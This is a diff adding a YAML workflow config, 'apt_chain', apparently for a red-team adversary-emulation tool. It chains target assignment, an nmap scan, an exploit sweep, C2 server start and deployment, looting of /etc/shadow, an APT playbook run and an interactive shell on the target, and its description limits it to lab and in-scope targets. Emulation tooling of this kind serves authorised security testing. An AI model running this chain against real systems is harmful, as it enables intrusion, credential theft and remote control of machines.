@@ -1,0 +1,25 @@
+name: apt_chain
+description: Full APT chain with one command — assign target, full scan (skipped
+  when sessions/scan_<target>.nmap.xml already exists), YAML exploit sweep from
+  scan triggers, playbook validate, playbook run, emulation staging, and live
+  emulation of every staged technique through a working target shell.
+  Sweep and emulation run against lab and in-scope targets only.
+defaults:
+  playbook: rocke
+steps:
+  - run: assign target {target}
+  - run: lazynmap {target}
+    skip_if_exists: sessions/scan_{target}.nmap.xml
+  - run: atomic_exploit
+  - run: c2_server start
+  - run: c2_deploy {target}
+  - run: c2_loot {target} /etc/shadow
+  - run: apt_playbook validate {playbook}
+  - run: apt_playbook run {playbook}
+  - run: attack_plan {plan_file}
+    resolve_newest:
+      glob: playbooks/attack_plan_*.yaml
+      as: plan_file
+  - run: atomic_emulate --target {target} --playbook {playbook}
+  - run: create_session_json
+  - run: atomic_shell --interactive {target}
